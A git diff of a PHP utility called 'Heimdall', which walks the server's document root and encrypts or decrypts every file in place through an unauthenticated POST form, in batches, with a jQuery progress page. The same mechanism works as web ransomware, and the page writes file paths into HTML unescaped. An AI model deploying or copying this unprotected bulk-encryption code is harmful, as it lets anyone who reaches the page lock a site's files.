@@ -6,30 +6,19 @@
  * Time: 18:55
  */
 
-
 ini_set('memory_limit','-1');
+ini_set('max_execution_time', 0);
 
-/**
- * Created by PhpStorm.
- * User: lenon
- * Date: 12/10/16
- * Time: 14:30
- */
 if(isset($_POST['action'])){
 
     $heimdall= new Heimdall();
     $heimdall->setPassword($_POST['password']);
     switch ($_POST['action']) {
-        case 'criptography':
-
-            $result=$heimdall->criptographyByUrl($_POST['path'],$_POST['NumberInit'],$_POST['NumberFinish']);
-
+        case 'cryptography':
+            $result=$heimdall->cryptographyByUrl($_POST['NumberInit'],$_POST['NumberFinish']);
             break;
-        case 'descriptography':
-            $heimdall->descriptographyByUrl($_POST['path'],$_POST['NumberInit'],$_POST['NumberFinish']);
-            break;
-        case 2:
-            echo "i equals 2";
+        case 'descryptography':
+            $result=$heimdall->descryptographyByUrl($_POST['NumberInit'],$_POST['NumberFinish']);
             break;
 
     }
@@ -54,30 +43,41 @@ if(isset($_POST['action'])){
                     $.ajax({
                         type: "post",
                         data: {
-                            action: 'criptography',
-                            //path: path,
+                            action: action,
                             password: password,
                             NumberInit:NumberInit,
                             NumberFinish:NumberFinish,
                         },
                         success: function (data) {
+
                             var dataArr = JSON.parse(data);
                             $.each(dataArr, function(index,item) {
-                                if(item.status=="edit ok"){
-                                    css='text-red';
+                                if(item.status=="encrypted" || item.status=="decrypted fail" ){
+                                    $('#numberFilesCrypted').html(parseInt($('#numberFilesCrypted').html())+1);
                                 }
-                                if(item.status=="edit fail"){
-                                    css='text-blue';
+                                if(item.status=="edit file fail" || item.status=="decrypted" || item.status=="encrypted fail"){
+                                    $('#numberFilesDecrypted').html(parseInt($('#numberFilesDecrypted').html())+1);
                                 }
-                                if(item.status=="crypted fail"){
-                                    css='text-green';
+                                if($('#totalOfResults').html().trim()<=5000){
+                                    if(item.status=="encrypted" || item.status=="decrypted fail" ){
+                                        css='text-red';
+                                    }
+                                    if(item.status=="edit file fail" || item.status=="decrypted"){
+                                        css='text-blue';
+                                    }
+                                    if(item.status=="encrypted fail" ){
+                                        css='text-green';
+                                    }
+                                    $('#table tr:last').after(
+                                        '<tr>' +
+                                        '<td>'+index+'</td>' +
+                                        '<td>'+item.url+'</td>' +
+                                        '<td class="'+css+'">'+item.status+'</td>' +
+                                        '</tr>');
+                                }else{
+                                    $('.message-blue').html('The structure is very big, why this we dont will show details');
                                 }
-                                $('#table tr:last').after(
-                                    '<tr>' +
-                                    '<td>'+index+'</td>' +
-                                    '<td>'+item.url+'</td>' +
-                                    '<td class="'+css+'">'+item.status+'</td>' +
-                                    '</tr>');
+
                                 loading(index);
                             });
 
@@ -85,66 +85,45 @@ if(isset($_POST['action'])){
                         }
                     });
                 }
+
                 $('#sendPass').click(function (){
                     clearMessage();
                     if($('#password').val()!="") {
-                        var collection = [];
-                        for ( var i = 100; i <= $('#totalOfResults').html().trim(); i=i+100 ) {
-                            collection.push(i);
-                        };
-                        collection.push(i+($('#totalOfResults').html().trim()-i));
+                        prepareSendData('cryptography',$('#password').val());
 
-                        iTime = 1;
-                        for(var i in collection) {
-                            setTimeout(function () {
-                                var j = collection.shift();
-                                sendData('criptography', $('#password').val(),j-100 ,j);
-                            }, 1000 * iTime);
-                            iTime++;
-                        }
                     }else{
                         $('.message-red').html('insert your password for cryptography');
                     }
 
-//                $.get("?pathfile="+$(this).attr('data-path'), function(data) {
-//                    $('#myModal').html(data);
-//                });
                 });
                 $('#sendDePass').click(function (){
                     clearMessage();
                     if($('#passwordDecrypt').val()!="") {
-                        iTime = 1;
-                        //$('#table > tbody  > tr').each(function () {
-                        for ( var i = 0; i <= $('#totalOfResults').html().trim(); i=i+100 ) {
-                            var $this = this;
-                            setTimeout(function () {
-                                //path = $($this).find('td:nth-child(2)').html().trim();
-                                $.ajax({
-                                    type: "post",
-                                    data: {
-                                        action: 'descriptography',
-                                        password: $('#passwordDecrypt').val(),
-                                        NumberInit:$('#NumberInit').val(),
-                                        NumberFinish:$('#NumberFinish').val(),
-                                    },
-                                    success: function (data) {
-                                        loading($($this).find('td:first-child').html().trim());
-                                        $('#NumberInit').val($('#NumberInit').val()+100);
-                                        $('#NumberFinish').val($('#NumberFinish').val()+100);
-                                        $($this).find('td:last-child').html('<span class=\'text-blue\'>decrypted</span>');
-                                    }
-                                });
-                            }, 300 * iTime);
-                            iTime++;
-                        }
-
-
-                        //});
+                        prepareSendData('descryptography',$('#passwordDecrypt').val());
                     }else{
 
                         $('.message-blue').html('insert your password for decrypt');
                     }
                 });
+
+                function prepareSendData(action,password){
+                    var collection = [];
+                    var totalResultsForRequest = 500;
+
+                    for ( var i = totalResultsForRequest; i <= $('#totalOfResults').html().trim(); i=i+totalResultsForRequest ) {
+                        collection.push(i);
+                    };
+                    collection.push(i+($('#totalOfResults').html().trim()-i));
+                    iTime = 1;
+                    for(var i in collection) {
+                        setTimeout(function () {
+                            var j = collection.shift();
+                            sendData(action, password,j-totalResultsForRequest ,j);
+                        }, 2000 * iTime);
+                        iTime++;
+                    }
+                    $('.message-green').html('Action finished!!');
+                }
 
                 function clearMessage(){
                     $('.message-blue').html('');
@@ -196,8 +175,6 @@ if(isset($_POST['action'])){
         <form id="formCriptography">
             <label>Password for encrypted</label>
             <input type="text" name="password" id="password">
-            <input type="hidden" name="NumberInit" id="NumberInit" value="0">
-            <input type="hidden" name="NumberFinish" id="NumberFinish" value="100">
             <input type="button" value="Send" id="sendPass">
         </form>
     </fieldset>
@@ -209,8 +186,6 @@ if(isset($_POST['action'])){
         <form id="formDecriptography">
             <label>Password for decrypted</label>
             <input type="text" name="passwordDecrypt" id="passwordDecrypt">
-            <input type="text" name="NumberInit" id="NumberInit">
-            <input type="text" name="NumberFinish" id="NumberFinish">
             <input type="button" value="Send" id="sendDePass">
         </form>
     </fieldset>
@@ -229,6 +204,19 @@ if(isset($_POST['action'])){
         <legend>
             Resume
         </legend>
+        <div class="numberFiles">
+            <?php
+            //list of files
+            $arrList=$heimdall->getDirContents($_SERVER['DOCUMENT_ROOT']);
+            echo "Total of <span id='totalOfResults'>".count($arrList)."</span> files<br>";
+            ?>
+        </div>
+        <div class="numberFiles">
+            <label>Files cryptography: </label><span id="numberFilesCrypted">0</span>
+        </div>
+        <div class="numberFiles">
+            <label>Files decryptography: </label><span id="numberFilesDecrypted">0</span>
+        </div>
         <div class="progress">
             <div class="progress-view">
 
@@ -253,40 +241,7 @@ if(isset($_POST['action'])){
         </table>
 
     </fieldset>
-    <?php
-    //list of files
-    $arrList=$heimdall->getDirContents($_SERVER['DOCUMENT_ROOT']);
-    echo "Total of <span id='totalOfResults'>".count($arrList)."</span> files<br>";
-    ?>
 
-    <!--            --><?php
-    //            foreach($arrList as $key=>$file){
-    //                ?>
-    <!---->
-    <!--                <tr>-->
-    <!---->
-    <!--                    <td>-->
-    <!--                        --><?php //  echo $key;?>
-    <!--                    </td>-->
-    <!--                    <td>-->
-    <!--                        --><?php //  echo $file;?>
-    <!--                    </td>-->
-    <!--                    <td>-->
-    <!--                        --><?php
-    //                        if($heimdall->checkIfIsCriptograpfy($file)){
-    //                            echo "<span class='text-red'>encrypted</span>";
-    //                        }else{
-    //                            echo "<span class='text-blue'>decrypted</span>";
-    //                        };
-    //
-    //                        ?>
-    <!--                    </td>-->
-    <!--                </tr>-->
-    <!--                --><?php
-    //            }
-    //            ?>
-    <!--            </tbody>-->
-    <!--        </table>-->
     </body>
     </html>
 <?php
@@ -346,25 +301,26 @@ class Heimdall{
         return file_get_contents($url);
     }
 
-    public function criptographyByUrl($url,$numberInit,$umberFinish){
+    public function cryptographyByUrl($numberInit,$umberFinish){
         $files=$this->getDirContents($_SERVER['DOCUMENT_ROOT']);
         $result=array();
         for ($i = $numberInit; $i<= $umberFinish ; $i++) {
-            $file = $this->readFile($files[$i]);
-            $fileCriptgrafy= $this->cryptography("<!-- Heimdall Cryptography Success -->".$file);
+            $url=$files[$i];
+            $file = $this->readFile($url);
+            $fileCriptgrafy= $this->cryptography("<!-- Heimdall Decryptography Success -->".$file);
             $arrSignature=explode("Heimdall---",$fileCriptgrafy);
-            $result[$i]['url']=$files[$i];
+            $result[$i]['url']=$url;
             if(isset($arrSignature[1]) and $url!=$_SERVER['SCRIPT_FILENAME']){
 
                 if($this->editFile($url,$fileCriptgrafy)){
 
-                    $result[$i]['status']="edit ok";
+                    $result[$i]['status']="encrypted";
                 }else{
-                    $result[$i]['status']="edit fail";
+                    $result[$i]['status']="edit file fail";
                 }
 
             }else{
-                $result[$i]['status']="crypted fail";
+                $result[$i]['status']="encrypted fail";
             }
         }
         return $result;
@@ -372,32 +328,35 @@ class Heimdall{
 
     }
 
-    public function descriptographyByUrl($url,$numberInit,$umberFinish){
+    public function descryptographyByUrl($numberInit,$umberFinish){
         $files=$this->getDirContents($_SERVER['DOCUMENT_ROOT']);
+        $result=array();
         for ($i = $numberInit; $i<= $umberFinish ; $i++) {
+            $url=$files[$i];
             $file = $this->readFile($url);
             $arrSignature=explode("Heimdall---",$file);
-
-            if(isset($arrSignature[1])){
+            $result[$i]['url']=$url;
+            if(isset($arrSignature[1]) and $url!=$_SERVER['SCRIPT_FILENAME']){
                 $fileDesCriptgrafy= $this->descryptography($file);
                 if($this->checkIfDecrypt($fileDesCriptgrafy)){
                     if($this->editFile($url,$fileDesCriptgrafy)){
-                        echo "edit ok";
+                        $result[$i]['status']= "decrypted";
                     }else{
-                        echo "edit fail";
+                        $result[$i]['status']="edit file fail";
                     }
                 }else{
-                    echo "decrypt fail";
+                    $result[$i]['status']= "decrypted fail1";
                 }
             }else{
-                echo "fail";
+                $result[$i]['status']= "decrypted fail2";
             }
         }
+        return $result;
 
     }
 
     private function checkIfDecrypt($file){
-        $validXmlrpc = preg_match("/<!-- Heimdall Cryptography Success -->(.*)/", $file, $matches, PREG_OFFSET_CAPTURE);
+        $validXmlrpc = preg_match("/<!-- Heimdall Decryptography Success -->(.*)/", $file, $matches, PREG_OFFSET_CAPTURE);
         if($validXmlrpc){
             return true;
         }
@@ -436,6 +395,3 @@ class Heimdall{
         return memory_get_usage();
     }
 }
-
-
-
